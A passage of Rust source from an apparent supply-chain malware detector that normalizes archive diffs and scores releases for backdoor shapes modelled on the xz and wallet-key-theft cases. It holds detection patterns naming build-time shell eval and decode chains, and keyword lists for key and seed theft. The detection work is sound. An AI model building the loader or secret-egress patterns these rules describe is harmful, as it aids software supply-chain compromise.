            || (hexish(&new_clean) && !old_clean.is_empty() && !hexish(&old_clean))
        {
            &old_clean
        } else {
            &new_clean
        },
    )
}

/// A name that is just a hex digest (with or without an extension).
fn hexish(name: &str) -> bool {
    let stem = name.split('.').next().unwrap_or(name);
    stem.len() >= 16 && stem.chars().all(|c| c.is_ascii_hexdigit())
}

fn clean_name(base: &str, ver: Option<&Version>) -> String {
    let mut s = base.to_string();
    if let Some(v) = ver {
        s = s.replace(&v.raw, "");
        // Windows installers commonly encode dotted versions with
        // underscores. `Version::detect` normalizes those for display, so
        // remove the source spelling too when deriving the artifact name.
        s = s.replace(&v.raw.replace('.', "_"), "");
    }
    // A long leading digit run is a quarantine/timestamp prefix, not a name.
    if let Some((head, rest)) = s.split_once('-')
        && head.len() >= 8
        && head.bytes().all(|b| b.is_ascii_digit())
    {
        s = rest.to_string();
    }
    for ext in [
        ".tar.gz", ".tar.xz", ".tgz", ".txz", ".tar", ".zip", ".gz", ".xz", ".whl",
    ] {
        if let Some(stripped) = s.strip_suffix(ext) {
            s = stripped.to_string();
            break;
        }
    }
    // Collapse separators left behind by removing the version token.
    while s.contains("..") {
        s = s.replace("..", ".");
    }
    while s.contains("--") {
        s = s.replace("--", "-");
    }
    while s.contains("_.") || s.contains("-.") {
        s = s.replace("_.", ".").replace("-.", ".");
    }
    s.trim_matches(['-', '.', '_', ' ']).to_string()
}

/// Pair members when only the outer archive directory carries a version.
///
/// cleave canonicalizes two single-file roots, but directory/archive-member
/// paths are currently paired literally. Reuse the same version detector and
/// name cleaning as the report's filename logic so
/// `pkg-1.0/bin/x` and `pkg-1.1/bin/x` are judged as one file. The raw report
/// remains untouched for evidence and auditing.
fn normalized_archive_diff(diff: &DiffReportV1) -> Cow<'_, DiffReportV1> {
    use std::collections::BTreeSet;

    let mut groups: BTreeMap<String, (Option<&FileDiffEntry>, Option<&FileDiffEntry>)> =
        BTreeMap::new();
    for file in &diff.files {
        if !file.path.contains("!!") {
            continue;
        }
        let key = normalized_member_path(&file.path);
        let pair = groups.entry(key).or_default();
        match file.status {
            FileStatus::Removed => pair.0 = Some(file),
            FileStatus::Added => pair.1 = Some(file),
            FileStatus::Changed | FileStatus::Unchanged => {}
        }
    }

    let mut aliases: Vec<(&FileDiffEntry, &FileDiffEntry)> = groups
        .values()
        .filter_map(|(old, new)| {
            let (Some(old), Some(new)) = (old.as_ref(), new.as_ref()) else {
                return None;
            };
            (old.path != new.path).then_some((*old, *new))
        })
        .collect();

    // npm distribution tarballs conventionally use `package/` as their root,
    // while a clean GitHub source snapshot normally uses `name-version/`.
    // Pair identical paths beneath those roots so a source-snapshot baseline
    // does not turn a one-file payload injection into 100% archive churn.
    // Requiring exactly one literal `package/` root keeps arbitrary renamed
    // multi-root archives distinct.
    let already_aliased: BTreeSet<&str> = aliases
        .iter()
        .flat_map(|(old, new)| [old.path.as_str(), new.path.as_str()])
        .collect();
    let mut npm_groups: BTreeMap<String, Vec<(&FileDiffEntry, bool)>> = BTreeMap::new();
    for file in &diff.files {
        if already_aliased.contains(file.path.as_str())
            || !matches!(file.status, FileStatus::Removed | FileStatus::Added)
        {
            continue;
        }
        if let Some((package_root, suffix)) = npm_snapshot_member_key(&file.path) {
            npm_groups
                .entry(suffix)
                .or_default()
                .push((file, package_root));
        }
    }
    for candidates in npm_groups.values() {
        let removed: Vec<_> = candidates
            .iter()
            .filter(|(file, _)| file.status == FileStatus::Removed)
            .collect();
        let added: Vec<_> = candidates
            .iter()
            .filter(|(file, _)| file.status == FileStatus::Added)
            .collect();
        // Exactly one removed and one added member under the same suffix is an
        // unambiguous rename; anything else is a genuine add or delete.
        if let ([(old, old_package)], [(new, new_package)]) = (removed.as_slice(), added.as_slice())
            && old_package != new_package
        {
            aliases.push((*old, *new));
        }
    }

    // Python source distributions commonly keep importable packages beneath
    // `name-version/src/`, while wheels place the same package directly at the
    // archive root. Pair only an exact suffix match across those two layouts.
    // Requiring one unambiguous removed/added pair, with exactly one `src/`
    // side, avoids turning arbitrary moves between directories into updates.
    let already_aliased: BTreeSet<&str> = aliases
        .iter()
        .flat_map(|(old, new)| [old.path.as_str(), new.path.as_str()])
        .collect();
    let mut python_groups: BTreeMap<String, Vec<(&FileDiffEntry, bool)>> = BTreeMap::new();
    for file in &diff.files {
        if already_aliased.contains(file.path.as_str())
            || !matches!(file.status, FileStatus::Removed | FileStatus::Added)
        {
            continue;
        }
        if let Some((sdist_src, suffix)) = python_distribution_member_key(&file.path) {
            python_groups
                .entry(suffix)
                .or_default()
                .push((file, sdist_src));
        }
    }
    for candidates in python_groups.values() {
        let removed: Vec<_> = candidates
            .iter()
            .filter(|(file, _)| file.status == FileStatus::Removed)
            .collect();
        let added: Vec<_> = candidates
            .iter()
            .filter(|(file, _)| file.status == FileStatus::Added)
            .collect();
        if let ([(old, old_sdist_src)], [(new, new_sdist_src)]) =
            (removed.as_slice(), added.as_slice())
            && old_sdist_src != new_sdist_src
        {
            aliases.push((*old, *new));
        }
    }
    if aliases.is_empty() {
        return Cow::Borrowed(diff);
    }
    let mut alias_by_path = BTreeMap::new();
    for (index, (old, new)) in aliases.iter().enumerate() {
        alias_by_path.insert(old.path.as_str(), index);
        alias_by_path.insert(new.path.as_str(), index);
    }

    let mut files = Vec::with_capacity(diff.files.len());
    for file in &diff.files {
        let Some(&alias_index) = alias_by_path.get(file.path.as_str()) else {
            files.push(file.clone());
            continue;
        };
        let (old, new) = aliases[alias_index];
        if old.path != file.path {
            continue;
        }
        let identity = merge_identity(old, new);
        let scopes = merge_scopes(old, new);
        let status =
            if identity.as_ref().is_some_and(|diff| diff.changed) || scope_diffs_changed(&scopes) {
                FileStatus::Changed
            } else {
                FileStatus::Unchanged
            };
        files.push(FileDiffEntry {
            path: new.path.clone(),
            file_type: new.file_type.clone().or_else(|| old.file_type.clone()),
            status,
            identity,
            scopes,
            old_formula: old.old_formula.clone(),
            new_formula: new.new_formula.clone(),
        });
    }
    // Built field by field rather than cloned-then-overwritten: `files` is the
    // expensive field (every changed member's strings, symbols, and trait rows
    // are owned), and cloning it only to replace it doubled the cost.
    Cow::Owned(DiffReportV1 {
        summary: normalized_summary(&files),
        files,
        old_root: diff.old_root.clone(),
        new_root: diff.new_root.clone(),
        scopes: diff.scopes.clone(),
    })
}

/// Return the path below an npm/source-snapshot archive root and whether the
/// root is npm's literal `package/` directory.
fn npm_snapshot_member_key(path: &str) -> Option<(bool, String)> {
    let member = path.rsplit("!!").next()?;
    let (root, suffix) = member.split_once('/')?;
    if root.eq_ignore_ascii_case("package") {
        return Some((true, suffix.to_ascii_lowercase()));
    }
    Version::detect(root).map(|_| (false, suffix.to_ascii_lowercase()))
}

/// Return an import-path key and whether it came from a versioned sdist's
/// conventional `src/` tree. Flat archive members are candidates only; they
/// can pair solely with an exact key from the sdist layout in the caller.
fn python_distribution_member_key(path: &str) -> Option<(bool, String)> {
    let member = path.rsplit("!!").next()?;
    let (root, suffix) = member.split_once('/')?;
    if Version::detect(root).is_some() {
        return suffix
            .strip_prefix("src/")
            .map(|suffix| (true, suffix.to_ascii_lowercase()));
    }
    if root.ends_with(".dist-info") || root.ends_with(".egg-info") {
        return None;
    }
    Some((false, member.to_ascii_lowercase()))
}

/// Whether any of the six scopes recorded an addition, removal, or change.
/// cleave's own erased per-scope view answers this, so the fan-out over the six
/// scopes stays where the scopes are defined.
fn scope_diffs_changed(scopes: &ScopeDiffs) -> bool {
    cleave::types::Scope::ALL
        .iter()
        .any(|s| scopes.view(*s).has_changes)
}

pub(crate) fn is_source_archive(path: &Path) -> bool {
    let lower = path.to_string_lossy().to_ascii_lowercase();
    [
        ".tar", ".tar.gz", ".tar.bz2", ".tar.xz", ".tar.zst", ".tbz2", ".txz",
    ]
    .iter()
    .any(|suffix| lower.ends_with(suffix))
}

/// Detect a newly introduced build macro whose shell-execution surface grows
/// sharply. This reads only source archives and only members that cleave could
/// not type as a recognized program; it is deliberately a content-shape
/// signal, not an xz filename or hash signature.
fn source_build_macro_anomaly(new_root: &Path, diff: &DiffReportV1) -> bool {
    diff.files.iter().any(|file| {
        if !matches!(file.status, FileStatus::Added | FileStatus::Changed)
            || !scope_diffs_changed(&file.scopes)
        {
            return false;
        }
        let Some((_, member)) = file.path.split_once("!!") else {
            return false;
        };
        let lower = member.to_ascii_lowercase();
        if !(lower.contains("/m4/") && lower.ends_with(".m4")) {
            return false;
        }
        let Ok(Some(bytes)) = cleave::extract_member(new_root, member) else {
            return false;
        };
        source_build_macro_score(&bytes)
    })
}

/// Detect a stable suspicious loader paired with a refreshed opaque carrier.
///
/// A normal differential omits unchanged files, which is usually ideal. For a
/// staged source attack, however, the invariant can be the strongest clue:
/// activation logic remains byte-for-byte stable while compressed test data
/// changes beneath it. Archive member indexes provide candidate M4 paths; only
/// members present on both sides, byte-identical, and independently matching
/// the precise loader chain qualify.
fn stable_source_loader_payload_refresh(
    old_root: &Path,
    new_root: &Path,
    diff: &DiffReportV1,
) -> bool {
    if !diff.files.iter().any(changed_test_carrier) {
        return false;
    }
    let mut candidates: BTreeMap<String, (Option<&str>, Option<&str>)> = BTreeMap::new();
    for file in &diff.files {
        let Some((_, member)) = file.path.split_once("!!") else {
            continue;
        };
        let lower = member.to_ascii_lowercase();
        if !(lower.ends_with(".m4") && (lower.contains("/m4/") || lower.starts_with("m4/"))) {
            continue;
        }
        let pair = candidates
            .entry(normalized_member_path(&file.path))
            .or_default();
        match file.status {
            FileStatus::Removed => pair.0 = Some(member),
            FileStatus::Added => pair.1 = Some(member),
            FileStatus::Unchanged | FileStatus::Changed => {
                pair.0 = Some(member);
                pair.1 = Some(member);
            }
        }
    }

    candidates.values().any(|(old_member, new_member)| {
        let (Some(old_member), Some(new_member)) = (*old_member, *new_member) else {
            return false;
        };
        let Ok(Some(old_bytes)) = cleave::extract_member(old_root, old_member) else {
            return false;
        };
        let Ok(Some(new_bytes)) = cleave::extract_member(new_root, new_member) else {
            return false;
        };
        old_bytes == new_bytes && source_build_macro_score(&new_bytes)
    })
}

fn changed_test_carrier(file: &FileDiffEntry) -> bool {
    if !matches!(file.status, FileStatus::Added | FileStatus::Changed) {
        return false;
    }
    let lower = file.path.to_ascii_lowercase();
    let in_test_data = ["/test/", "/tests/", "/fixtures/", "/testdata/"]
        .iter()
        .any(|segment| lower.contains(segment));
    in_test_data
        && [".xz", ".lzma", ".gz", ".bz2", ".zst"]
            .iter()
            .any(|suffix| lower.ends_with(suffix))
}

fn source_build_macro_score(bytes: &[u8]) -> bool {
    let text = String::from_utf8_lossy(bytes);
    // The useful source-level combination is a build-time command hook that
    // discovers an Automake/configuration file and evaluates transformed
    // output. Each atom is legitimate in isolation; together in a newly
    // changed macro they describe executable build-time indirection.
    let deferred_shell = text.contains("AC_CONFIG_COMMANDS")
        && text.contains("eval ")
        && (text.contains("| $SHELL") || text.contains("| /bin/sh"));
    let recursive_source_search = text.contains("grep -")
        && text.contains("$srcdir")
        && (text.contains("grep -r")
            || text.contains("grep -R")
            || text.contains("grep -aEr")
            || text.contains("grep -aER"));
    let carrier_decode = text.contains("sed ")
        && text.contains("| eval ")
        && text.contains(" -d")
        && text.contains("tr ");
    deferred_shell && recursive_source_search && carrier_decode
}

fn merge_identity(old: &FileDiffEntry, new: &FileDiffEntry) -> Option<cleave::types::IdentityDiff> {
    let old_id = old.identity.as_ref().and_then(|i| i.old.clone());
    let new_id = new.identity.as_ref().and_then(|i| i.new.clone());
    (old_id.is_some() || new_id.is_some()).then_some(cleave::types::IdentityDiff {
        changed: old_id != new_id,
        old: old_id,
        new: new_id,
    })
}

fn merge_scopes(old: &FileDiffEntry, new: &FileDiffEntry) -> ScopeDiffs {
    ScopeDiffs {
        traits: merge_scope(
            old.scopes.traits.as_ref(),
            new.scopes.traits.as_ref(),
            |item: &TraitChange| item.id.clone(),
            |old, new| {
                old.trait_section == new.trait_section
                    && old.crit == new.crit
                    && old.desc == new.desc
                    && old.count == new.count
            },
        ),
        metrics: merge_scope(
            old.scopes.metrics.as_ref(),
            new.scopes.metrics.as_ref(),
            |item: &MetricChange| item.path.clone(),
            |old, new| old.value == new.value,
        ),
        kv: merge_scope(
            old.scopes.kv.as_ref(),
            new.scopes.kv.as_ref(),
            |item: &KvChange| item.path.clone(),
            |old, new| old.namespace == new.namespace && old.value == new.value,
        ),
        symbols: merge_scope(
            old.scopes.symbols.as_ref(),
            new.scopes.symbols.as_ref(),
            |item: &SymbolChange| format!("{:?}:{}:{:?}", item.kind, item.symbol, item.library),
            |old, new| old.kind == new.kind && old.library == new.library,
        ),
        strings: merge_scope(
            old.scopes.strings.as_ref(),
            new.scopes.strings.as_ref(),
            |item: &StringChange| item.value.clone(),
            |_, _| true,
        ),
        sections: merge_scope(
            old.scopes.sections.as_ref(),
            new.scopes.sections.as_ref(),
            |item: &SectionChange| item.name.clone(),
            |old, new| {
                old.size == new.size
                    && old.entropy == new.entropy
                    && old.permissions == new.permissions
            },
        ),
    }
}

/// Reconstruct a scope from the two sides of a literal-path add/remove pair.
/// The raw cleave entries already contain the complete old/new inventories;
/// only their paths caused the apparent deletion/addition. Typed equality
/// keeps this generic across cleave's six scope item types without serializing
/// large member inventories.
fn merge_scope<T: Clone>(
    old: Option<&ScopeDiff<T>>,
    new: Option<&ScopeDiff<T>>,
    key: impl Fn(&T) -> String,
    equal: impl Fn(&T, &T) -> bool,
) -> Option<ScopeDiff<T>> {
    let (Some(old), Some(new)) = (old, new) else {
        return old.cloned().or_else(|| new.cloned());
    };
    let mut old_items = BTreeMap::new();
    for item in old
        .removed
        .iter()
        .chain(old.changed.iter().map(|change| &change.old))
    {
        old_items.insert(key(item), item.clone());
    }
    let mut new_items = BTreeMap::new();
    for item in new
        .added
        .iter()
        .chain(new.changed.iter().map(|change| &change.new))
    {
        new_items.insert(key(item), item.clone());
    }

    let mut merged = ScopeDiff::default();
    for (item_key, old_item) in old_items {
        match new_items.remove(&item_key) {
            Some(new_item) if equal(&old_item, &new_item) => {}
            Some(new_item) => merged.changed.push(Changed {
                old: old_item,
                new: new_item,
            }),
            None => merged.removed.push(old_item),
        }
    }
    merged.added.extend(new_items.into_values());
    merged.old_count = old.old_count;
    merged.new_count = new.new_count;
    merged.old_weight = old.old_weight;
    merged.new_weight = new.new_weight;
    merged.change_weight = merged.change_count() as f32;
    merged.truncated = old.truncated || new.truncated;
    merged.recompute_roc();
    Some(merged)
}

fn normalized_summary(files: &[FileDiffEntry]) -> DiffSummary {
    let mut summary = DiffSummary::default();
    for file in files {
        match file.status {
            FileStatus::Added => summary.files_added += 1,
            FileStatus::Removed => summary.files_removed += 1,
            FileStatus::Changed => summary.files_changed += 1,
            FileStatus::Unchanged => summary.files_unchanged += 1,
        }
    }
    // The six scopes, in the order the per-file weight array below lists them.
    // Named here rather than reusing cleave's `Scope::ALL` positionally: this
    // function reads the six `ScopeDiffs` fields by hand, so the pairing has to
    // be stated where those fields are, not inferred from a foreign constant
    // whose order could change without a compile error here.
    use cleave::types::Scope;
    const ORDER: [Scope; 6] = [
        Scope::Traits,
        Scope::Metrics,
        Scope::Kv,
        Scope::Symbols,
        Scope::Strings,
        Scope::Sections,
    ];
    let mut present = [false; 6];
    let mut old_weight = [0.0_f32; 6];
    let mut new_weight = [0.0_f32; 6];
    let mut change_weight = [0.0_f32; 6];
    for file in files {
        for (index, scope) in [
            file.scopes
                .traits
                .as_ref()
                .map(|s| (s.old_weight, s.new_weight, s.change_weight)),
            file.scopes
                .metrics
                .as_ref()
                .map(|s| (s.old_weight, s.new_weight, s.change_weight)),
            file.scopes
                .kv
                .as_ref()
                .map(|s| (s.old_weight, s.new_weight, s.change_weight)),
            file.scopes
                .symbols
                .as_ref()
                .map(|s| (s.old_weight, s.new_weight, s.change_weight)),
            file.scopes
                .strings
                .as_ref()
                .map(|s| (s.old_weight, s.new_weight, s.change_weight)),
            file.scopes
                .sections
                .as_ref()
                .map(|s| (s.old_weight, s.new_weight, s.change_weight)),
        ]
        .into_iter()
        .enumerate()
        {
            if let Some((old, new, changed)) = scope {
                present[index] = true;
                old_weight[index] += old;
                new_weight[index] += new;
                change_weight[index] += changed;
            }
        }
    }
    let mut rocs = ScopeRocs::default();
    let mut total = 0.0;
    let mut count = 0;
    for (index, scope) in ORDER.into_iter().enumerate() {
        let denominator = old_weight[index].max(new_weight[index]);
        let roc = if denominator > 0.0 {
            (change_weight[index] / denominator).min(1.0)
        } else {
            0.0
        };
        rocs.set(scope, roc);
        if present[index] && (old_weight[index] > 0.0 || new_weight[index] > 0.0) {
            total += roc;
            count += 1;
        }
    }
    summary.scope_roc = rocs;
    summary.overall_roc = if count == 0 {
        0.0
    } else {
        total / count as f32
    };
    summary
}

// ── proportionality ─────────────────────────────────────────────────────────

/// Behavioral drift weighed against the version bump's promise.
///
/// One value rather than a `bool` beside an `Option<String>`: those encode three
/// real states in six, and every consumer had to re-join them by hand to know
/// which of the two very different sentences it was about to print.
#[derive(Debug)]
pub(crate) enum Drift {
    /// No bump to weigh against, or no capability gained to weigh.
    Unjudged,
    WithinTolerance(String),
    Disproportionate(String),
}

impl Drift {
    /// Whether the gain outran what the bump promised — the escalation signal.
    pub(crate) fn is_disproportionate(&self) -> bool {
        matches!(self, Self::Disproportionate(_))
    }

    /// The phrasing for either judgement. Both are worth telling a reader and
    /// the model: "within tolerance for a patch release" is release-pressure
    /// context, not merely the absence of a finding.
    pub(crate) fn note(&self) -> Option<&str> {
        match self {
            Self::Unjudged => None,
            Self::WithinTolerance(note) | Self::Disproportionate(note) => Some(note),
        }
    }

    /// The note *only* when it is the escalating one, for the surfaces that
    /// report findings rather than context.
    pub(crate) fn escalation_note(&self) -> Option<&str> {
        match self {
            Self::Disproportionate(note) => Some(note),
            _ => None,
        }
    }
}

/// The two change-shape reads: behavioral drift vs the version bump's promise,
/// and behavioral drift vs content drift (`skew`).
#[derive(Debug)]
pub(crate) struct Proportionality {
    pub drift: Drift,
    /// Behavioral change far outpacing content change — the implant tell. A
    /// rewrite moves both together; a surgical backdoor moves behavior on a
    /// small edit (xz: 99% of behavior on a ~20% content change).
    pub skew: Option<String>,
}

impl Proportionality {
    fn eval(
        a: &Assessment,
        naming: &Naming,
        diff: &DiffReportV1,
        source_archive: bool,
        source_build_anomaly: bool,
        runtime_entrypoints: &HashSet<String>,
    ) -> Self {
        let skew = skew_note(a, diff);
        // Proportionality needs both halves of the comparison: a version bump
        // making a promise, and a capability gain to weigh against it.
        let Some(bump) = naming
            .bump
            .filter(|_| a.behavioral.severity != Severity::None)
        else {
            return Self {
                drift: Drift::Unjudged,
                skew,
            };
        };
        // A medium behavior in a patch is not enough by itself: ordinary
        // plugin maintenance can add one new web/API capability. Require a
        // change-shape signal as well (focused multi-capability edit,
        // endgame deletion, or the existing behavior/content skew read).
        //
        // Skew alone is not enough either. It measures how *surgically* the
        // edit was made, not how much capability arrived, and in a one-file
        // artifact or a tightly-scoped patch the traits scope always outruns
        // the content scopes — so a single added capability clears it for
        // free. An implant brings several classes at once, which is why the
        // focused-source branches below all carry a class floor; give the
        // skew branch the same footing. The case this was costing:
        // contact-form-7-multi-step's own incident-response patch, written by
        // the WordPress.org review team to reset the accounts the attacker
        // created, gained exactly one capability (a user password field) and
        // was escalated to a gate-failing High for it.
        let new_classes = a
            .behavioral
            .categories
            .iter()
            .filter(|c| !c.new_ids.is_empty())
            .count();
        let shape_signal = (skew.is_some() && new_classes >= 2)
            || change_shape_escalation(
                a,
                diff,
                naming.bump,
                source_archive,
                source_build_anomaly,
                runtime_entrypoints,
            ) >= Severity::High;
        let drift = if a.behavioral.severity > bump.tolerance() && shape_signal {
            Drift::Disproportionate(format!(
                "disproportionate — {} gained a {}-severity capability",
                bump.describe(),
                a.behavioral.severity.as_str()
            ))
        } else {
            Drift::WithinTolerance(format!("within tolerance for {}", bump.describe()))
        };
        Self { drift, skew }
    }
}

/// Skew read over the per-scope rates of change: fires when the traits scope
/// (behavior) moved at least `SKEW_RATIO`× the mean of the content scopes and
/// a judged capability actually appeared. Calibrated on the bundled cases: the
/// xz backdoor sits at 4.5×; full rewrites (behavior and content moving
/// together) sit below 2.5×.
fn skew_note(a: &Assessment, diff: &DiffReportV1) -> Option<String> {
    const SKEW_RATIO: f32 = 3.0;
    // A broad release can legitimately change many traits while its metric
    // scopes stay relatively quiet (especially source-heavy packages). The
    // surgical signal is for a small focused edit; archive-root churn is
    // normalized before this point, so this is now a meaningful guard.
    if !compact_change(&diff.summary) {
        return None;
    }
    let s = &diff.summary.scope_roc;
    let content: Vec<f32> = [s.metrics, s.kv, s.symbols, s.strings, s.sections]
        .into_iter()
        .filter(|r| *r > 0.0)
        .collect();
    if content.is_empty() || a.behavioral.severity < Severity::Medium {
        return None;
    }
    let mean = content.iter().sum::<f32>() / content.len() as f32;
    (s.traits >= 0.5 && s.traits >= mean * SKEW_RATIO).then(|| {
        format!(
            "surgical — {:.0}% of behavior changed on a {:.0}% content change",
            s.traits * 100.0,
            mean * 100.0,
        )
    })
}

/// A change small enough for the shape rules below to mean anything. They look
/// for a payload concentrated in a few files; across a thousand-file framework
/// release the same signals are just unrelated local extrema, so every one of
/// them bounds itself here — on the same count of touched files, at the same
/// number.
fn compact_change(s: &DiffSummary) -> bool {
    s.files_changed + s.files_added + s.files_removed <= 16
}

/// A release that claims to carry nothing new: the same version republished, a
/// patch, or a prerelease. A major bump can legitimately arrive with new
/// behavior, so the shape rules below spend their suspicion here, where the
/// version number promises there is almost nothing to see.
fn routine_release(bump: Option<Bump>) -> bool {
    bump.is_some_and(|b| {
        matches!(
            b.kind,
            BumpKind::Same | BumpKind::Patch | BumpKind::Prerelease
        )
    })
}

/// Whether the change introduced a capability class it did not have before —
/// the probe the shape rules below are built from. An escalation of a class
/// that already existed does not count: these rules are about new behavior.
fn has_new_class(a: &Assessment, class: &str) -> bool {
    a.behavioral
        .categories
        .iter()
        .any(|c| c.class == class && !c.new_ids.is_empty())
}

/// Raise a gate when the *shape* of the change is itself implant-like.
///
/// The first branch catches a focused source-file implant: several wholly new
/// capability classes arriving in one or two files, with enough overall and
/// behavioral movement that this is not just a metadata touch. The second
/// catches endgame sabotage such as a package retaining only a tiny manifest
/// after removing hundreds of library files. These are intentionally broad
/// metrics, not attack-specific trait names.
fn change_shape_escalation(
    a: &Assessment,
    diff: &DiffReportV1,
    bump: Option<Bump>,
    source_archive: bool,
    source_build_anomaly: bool,
    runtime_entrypoints: &HashSet<String>,
) -> Severity {
    let s = &diff.summary;
    let same_version = bump.is_some_and(|b| matches!(b.kind, BumpKind::Same));
    // The shared size bound: a small, focused change. Several branches below
    // are meaningful only within one, and a large release trips none of them.
    let compact = compact_change(s);
    let new_classes = a
        .behavioral
        .categories
        .iter()
        .filter(|c| !c.new_ids.is_empty())
        .count();
    let focused_source = s.files_changed <= 2
        && s.files_added <= 2
        && s.files_removed <= 2
        && s.overall_roc >= 0.20
        && s.scope_roc.traits >= 0.40
        && new_classes >= 3;
    // A release can also delete a modest amount of stale package content
    // while concentrating several new capabilities in a few changed files.
    // Keep this separate from the small focused branch: the higher movement
    // and four-class floor prevent routine patch cleanup from escalating.
    let focused_source_with_cleanup = s.files_changed <= 4
        && s.files_added + s.files_removed <= 16
        && s.overall_roc >= 0.60
        && s.scope_roc.traits >= 0.60
        && new_classes >= 4;
    // A compact cross-domain capability cluster is suspicious even when the
    // individual rules remain medium: HTTP plus scheduling and serialization
    // in a small patch is a common dormant-loader shape. The class count and
    // movement floors keep ordinary single-purpose WordPress changes below
    // this branch.
    let cross_domain_cluster = compact
        && s.overall_roc >= 0.05
        && s.scope_roc.traits >= 0.15
        && new_classes >= 6
        && ["communications/http", "time/schedule", "data/serialize"]
            .iter()
            .all(|class| has_new_class(a, class));
    let endgame = endgame_package_shape(s);
    // A dependency addition paired with a new fallback module load is a
    // compact supply-chain shape: the release pulls in new code and changes
    // how it is loaded, even when neither fact is individually high severity.
    // Keep the size bound so a large, ordinary framework rewrite does not trip
    // merely because it also reorganized imports.
    let dependency_with_fallback_load = dependency_with_fallback_load(a, diff);
    let dependency_backed_api =
        dependency_backed_public_api_anomaly(diff, bump, runtime_entrypoints).is_some();
    let source_download_execute =
        source_download_write_execute_anomaly(diff, bump, runtime_entrypoints).is_some();
    // A remote browser loader, whether its destination is a literal host or is
    // assembled from character codes, is much stronger than any component
    // atomic. Require complete convergence on one file and use it as release-
    // pressure evidence only for same/patch releases: a major browser
    // framework can legitimately add a loader, but a patch has almost no
    // budget for a new remote-code path.
    let remote_script_loader = routine_release(bump)
        && (obfuscated_remote_script_loader(diff) || external_remote_script_loader(diff));
    // A newly added encrypted ZIP disguised as another resource format is a
    // compact payload-delivery clue. Keep the differential rule narrow: it
    // must contain many encrypted entries and an executable member, so a
    // routine password-protected source archive does not fail a release.
    let added_encrypted_payload_archive = same_version
        && diff.files.iter().any(|file| {
            matches!(file.status, FileStatus::Added)
                && file.scopes.traits.as_ref().is_some_and(|traits| {
                    let has = |id: &str| {
                        traits
                            .added
                            .iter()
                            .any(|trait_change| trait_change.id == id)
                    };
                    has("micro-behaviors/data/archive/zip::zip-encrypted-entry")
                        && has("micro-behaviors/data/archive/zip::zipcrypto-many-encrypted-entries")
                        && has(
                            "metadata/file/extension/identity::archive-content-extension-mismatch",
                        )
                        && has("metadata/file/metrics::archive-contains-executable-member")
                })
        });
    // A same-version archive replacement is unusual on its own, but it is a
    // strong supply-chain shape when the replacement also changes archive
    // protection and introduces anti-analysis signals. This catches bundled
    // desktop trojans whose payload is spread across a rebuilt app bundle and
    // never produces one high trait.
    let same_version_archive_replacement = same_version
        && s.files_added >= 32
        && s.files_removed >= 32
        && s.files_changed <= 2
        && s.overall_roc >= 0.75
        && s.scope_roc.traits >= 0.20
        && new_classes >= 2
        && has_new_class(a, "data/archive")
        && has_new_class(a, "anti-analysis");
    // A payload can be hidden one archive layer below the package and look
    // like a harmless resource (OpenX's PHP-in-JavaScript case is the model).
    // Keep this content-agnostic: require the same nested member to gain all
    // three independent signals — concealment/encoding, execution, and a
    // delivery or filesystem effect.
    let nested_payload_cluster = compact
        && diff.files.iter().any(|file| {
            if file.path.matches("!!").count() < 2 {
                return false;
            }
            let Some(traits) = file.scopes.traits.as_ref() else {
                return false;
            };
            let text = traits
                .added
                .iter()
                .map(|t| format!("{} {}", t.id, t.desc))
                .chain(
                    traits
                        .changed
                        .iter()
                        .map(|change| format!("{} {}", change.new.id, change.new.desc)),
                )
                .map(|text| text.to_ascii_lowercase())
                .collect::<Vec<_>>();
            let has = |needles: &[&str]| {
                text.iter()
                    .any(|value| needles.iter().any(|needle| value.contains(needle)))
            };
            has(&[
                "anti-static",
                "obfuscat",
                "encoded",
                "base64",
                "rot13",
                "decode",
            ]) && has(&[
                "process/interpreter",
                "eval",
                "include",
                "require",
                "exec",
                "shell",
            ]) && has(&[
                "communications/http",
                "fs/",
                "file/write",
                "file_get_contents",
                "network",
            ])
        });
    let nested_capability_cluster = compact
        && diff.files.iter().any(|file| {
            if file.path.matches("!!").count() < 2 {
                return false;
            }
            let Some(traits) = file.scopes.traits.as_ref() else {
                return false;
            };
            let classes = traits
                .added
                .iter()
                .map(|t| crate::rubric::capability_class(&t.id))
                .chain(
                    traits
                        .changed
                        .iter()
                        .map(|c| crate::rubric::capability_class(&c.new.id)),
                )
                .flatten()
                .collect::<HashSet<_>>();
            [
                "anti-static",
                "process/interpreter",
                "communications/http",
                "fs/file",
            ]
            .iter()
            .all(|class| classes.iter().any(|got| got == class))
        });
    let encoded_payload_classes = [
        "file/encoded",
        "anti-static",
        "process/interpreter",
        "communications/http",
        "fs/file",
    ]
    .iter()
    .filter(|class| has_new_class(a, class))
    .count();
    // A newly encoded/obfuscated file plus execution and an external or file
    // effect is a compact payload shape even when normal package files moved
    // around it. This is deliberately a class-level combination, not a
    // filename or campaign signature.
    let encoded_payload_cluster = encoded_payload_classes >= 3
        && compact
        && has_new_class(a, "anti-static")
        && has_new_class(a, "file/encoded");

    // Two platform-neutral release shapes deserve a high review signal even
    // when each individual trait is only medium:
    //
    // * build-time/native hook + low-level syscall + network + anti-analysis;
    // * wallet/private-key material + encoding + an external HTTP destination.
    // These describe the xz and xrpl families without naming either campaign.
    let has_prefix = |prefix: &str| {
        a.behavioral
            .categories
            .iter()
            .any(|category| category.class.starts_with(prefix) && !category.new_ids.is_empty())
    };
    let new_id_contains = |needles: &[&str]| {
        a.behavioral
            .categories
            .iter()
            .filter(|category| !category.new_ids.is_empty())
            .flat_map(|category| category.new_ids.iter())
            .any(|id| {
                let id = id.to_ascii_lowercase();
                needles.iter().any(|needle| id.contains(needle))
            })
    };
    let native_hook_cluster = has_prefix("process/create")
        && has_prefix("communications/http")
        && has_prefix("anti-analysis")
        && (has_prefix("os/syscall")
            || has_prefix("supply-chain/install-hook")
            || has_prefix("os/signal"));
    let native_build_hook_cluster = has_prefix("process/create")
        && has_prefix("supply-chain")
        && (has_prefix("os/syscall")
            || has_prefix("os/signal")
            || new_id_contains(&["syscall", "sigaction", "raw-"]))
        && (!source_archive || source_build_anomaly);
    // Release-pressure evidence, like `remote_script_loader` above: the legs
    // below are a wallet library's ordinary job description, so they only
    // indict a release whose version number promised nothing new. xrpl.js
    // 2.14.1 -> 4.2.0 satisfies every leg — HTTP, base64, seed generation and
    // a remote host URL — because that is what an XRP Ledger client does
    // across two major versions; 2.14.1 -> 2.14.2, the real key-exfiltration
    // patch, is where the same conjunction means something.
    let secret_egress_cluster = routine_release(bump)
        && has_prefix("communications/http")
        && (has_prefix("data/encode") || has_prefix("data/decode") || has_prefix("file/encoded"))
        && (has_prefix("crypto/library") || has_prefix("crypto/asymmetric"))
        && new_id_contains(&["private-key", "mnemonic", "wallet", "seed"])
